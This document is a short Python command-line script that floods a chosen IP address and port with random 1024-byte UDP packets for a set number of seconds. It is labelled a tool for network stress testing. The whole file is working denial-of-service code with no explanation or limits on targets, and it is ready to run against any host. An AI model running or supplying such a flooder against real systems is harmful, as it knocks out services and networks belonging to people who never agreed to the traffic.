#!/usr/bin/env python3

import socket
import random
import argparse
import time

def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    sent = 0
    print(f"[+] Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")
    while time.time() < timeout:
        bytes_to_send = random._urandom(1024)
        client.sendto(bytes_to_send, (target_ip, target_port))
        sent += 1
        print(f"[+] Sent packet #{sent} to {target_ip}:{target_port}", end='\r')

    print(f"\n[+] UDP flood finished. Total packets sent: {sent}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple UDP Flood Tool for Network Stress Testing")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Duration in seconds")

    args = parser.parse_args()
    udp_flood(args.ip, args.port, args.duration)
